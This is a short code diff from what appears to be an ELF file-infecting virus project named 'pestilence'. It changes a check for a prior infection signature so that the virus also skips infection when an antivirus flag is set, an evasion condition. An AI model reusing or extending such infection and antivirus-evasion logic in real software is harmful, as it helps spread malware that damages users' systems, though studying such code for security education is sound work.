@@ -23,7 +23,7 @@ void    ft_pointer_strings_table(t_pestilence *pestilence)
 int ft_detect_prev_infection(t_pestilence *pestilence)
 {
     pestilence->signd = memmem(pestilence->elf, pestilence->file_size, SIGNATURE, strlen(SIGNATURE));
-    if (pestilence->signd)
+    if (pestilence->signd || pestilence->anti_virus == 1)
         return (0);
     else
         return(-1);
